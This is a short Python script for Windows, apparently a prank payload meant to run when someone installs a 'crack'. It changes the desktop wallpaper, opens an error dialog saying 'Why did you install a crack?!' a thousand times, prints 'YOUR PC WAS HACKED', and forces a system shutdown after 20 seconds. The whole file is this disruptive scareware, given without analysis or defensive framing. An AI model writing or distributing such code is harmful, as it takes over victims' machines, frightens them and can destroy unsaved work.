import ctypes
import os
import tkinter as tk
from tkinter import messagebox
import winsound
import subprocess

def change_wallpaper(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        for _ in range(1000): 
            show_message("Warning", "Why did you install a crack?!")
        print("#ctypes:1000")
    except Exception as e:
        show_message("Error", f"Failed to change wallpaper: {e}")
        
def shutdown_pc():
    winsound.Beep(1000, 500)  
    winsound.Beep(1500, 500)
    print("YOUR PC WAS HACKED LOL HAHAH")
    subprocess.run("shutdown /s /t 20", shell=True)

def show_message(title, message):
    root = tk.Tk()
    root.withdraw()  
    messagebox.showerror(title, message)

image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg"  

change_wallpaper(image_path)
shutdown_pc()
